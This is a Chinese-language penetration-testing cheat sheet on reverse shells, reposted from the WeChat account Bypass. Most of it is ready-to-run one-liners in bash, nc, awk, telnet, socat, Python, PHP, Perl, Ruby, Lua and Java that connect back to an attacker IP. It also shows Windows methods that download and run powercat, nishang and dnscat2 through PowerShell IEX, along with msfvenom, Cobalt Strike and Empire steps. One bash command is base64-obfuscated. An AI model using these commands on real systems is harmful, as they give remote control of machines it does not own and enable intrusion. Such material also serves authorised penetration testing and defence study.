---
title: 反弹shell
---

反弹shell的各种姿势。

# bash反弹shell

参考链接：
[Linux 反弹shell（二）反弹shell的本质](https://xz.aliyun.com/t/2549)

# java反弹shell

参考链接：
[使用Java反弹shell](https://blog.spoock.com/2018/11/07/java-reverse-shell/)

# 反弹shell的各种姿势
  

> **来自公众号：Bypass**

在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。  

反弹shell是打开内网通道的第一步，也是权限提升过程中至关重要的一步。本文所有姿势整理自网络，并基于同一个假设的前提下完成测试和验证。（假设：攻击者主机为：192.168.99.242，本地监听1234端口，如有特殊情况以下会备注说明。）

* * *

**Linux 反弹shell**  

**姿势一：bash反弹**

    
    bash -i >& /dev/tcp/192.168.99.242/1234 0>&1

    base64版：bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjI0Mi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}'
    在线编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html

其他版本：
        
    exec 5<>/dev/tcp/192.168.99.242/1234;cat <&5 | while read line; do $line 2>&5 >&5;done
    exec /bin/sh 0</dev/tcp/192.168.99.242/1234 1>&0 2>&0

**姿势二：nc反弹**

    nc -e /bin/bash 192.168.99.242 1234

**姿势三：awk反弹**

    awk 'BEGIN{s="/inet/tcp/0/192.168.99.242/1234";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'

**姿势四：telnet反弹**

备注：需要在攻击主机上分别监听1234和4321端口，执行反弹shell命令后，在1234终端输入命令，4321查看命令执行后的结果。

    telnet 192.168.99.242 1234 | /bin/bash | telnet 192.168.99.242 4321

**姿势五：socat反弹**

    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.99.242:1234

**姿势六：Python反弹**

    python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.99.242',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

**姿势七：PHP反弹**

    php -r '$sock=fsockopen("192.168.99.242",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

**姿势八：Perl反弹**

    perl -e 'use Socket;$i="192.168.99.242";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

**姿势九：Ruby反弹**

    ruby -rsocket -e'f=TCPSocket.open("192.168.99.242",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

**姿势十：Lua反弹**

    lua -e "require('socket');require('os');t=socket.tcp();t:connect('192.168.99.242','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"

**姿势十一：JAVA反弹**

    
    public class Revs {
        /**
        * @param args
        * @throws Exception 
        */
    public static void main(String[] args) throws Exception {
            // TODO Auto-generated method stub
            Runtime r = Runtime.getRuntime();
            String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/192.168.99.242/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"};
            Process p = r.exec(cmd);
            p.waitFor();
        }
    }

保存为Revs.java文件，编译执行，成功反弹shell。

    javac Revs.java 
    java Revs

* * *

  

**Windows反弹shell**  

**姿势一：nc反弹**

    netcat 下载：https://eternallybored.org/misc/netcat/
    服务端反弹：nc 192.168.99.242 1234 -e c:\windows\system32\cmd.exe

**姿势二：powershell反弹**

powercat是netcat的powershell版本，功能免杀性都要比netcat好用的多。

    PS C:\WWW>powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.99.242 -p 1234 -e cmd

下载到目标机器本地执行：

    PS C:\WWW> Import-Module ./powercat.ps1
    PS C:\WWW> powercat -c 192.168.99.242 -p 1234 -e cmd

**姿势三：MSF反弹shell**

使用msfvenom生成相关Payload

    msfvenom -l payloads | grep 'cmd/windows/reverse'
    msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.99.242 LPORT=1234


**姿势四：Cobalt strike反弹shell**

    1、配置监听器：点击Cobalt Strike——>Listeners——>在下方Tab菜单Listeners，点击add。
    2、生成payload：点击Attacks——>Packages——>Windows Executable，保存文件位置。
    3、目标机执行powershell payload

**姿势五：Empire反弹shell**

    usestager windows/launcher_vbs
    info
    set Listener test
    execute

**姿势六：nishang反弹shell**

Reverse TCP shell：

    powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com /samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.1.1.210 -port 1234

Reverse UDP shell：

    powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellUdp.ps1');
    Invoke-PowerShellUdp -Reverse -IPAddress 10.1.1.210 -port 1234


**姿势七：Dnscat反弹shell**

github项目地址：

    https://github.com/iagox86/dnscat2

`服务端：  
`

    ruby dnscat2.rb --dns "domain=lltest.com,host=xx.xx.xx.xx" --no-cache -e open -e open 

`目标主机：  
`

    powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');Start-Dnscat2 -Domain lltest.com -DNSServer xx.xx.xx.xx

  

* * *

**推荐↓↓↓**

参考链接：
[反弹shell的各种姿势--来自公众号：Bypass](https://mp.weixin.qq.com/s/uHSDdwYNh_Of1lRSRXy6Vw?st=15992400DCFFF8BBB7FFCF009F5C796BD64AB41828A42DD46C545FF1C80FEA673FE1DC35B3C18541094BFACCDDBBF7AB435D4A9FCC64EA10144B3E49A3B10F1A5478CAE67CD92D6B4A5005B80378141107FB52ED9226D4EB1BEA330F1D3468F059978CE1B7A378A636B33D9DBDCFD35816424569BE8703C6CF8C668A77593027214332E8032CE9D23768645D1725F7DF&vid=1688853548483784&cst=B57A31FA0CF3C96337830CF18B35C6853123683F479732A9591AC548E35BA55CD8D769A0A5F4DCEA9C0F5AF2824CB294&deviceid=c0d114ff-72af-4384-bca6-45156f6c7a70&version=3.0.31.2998&platform=win)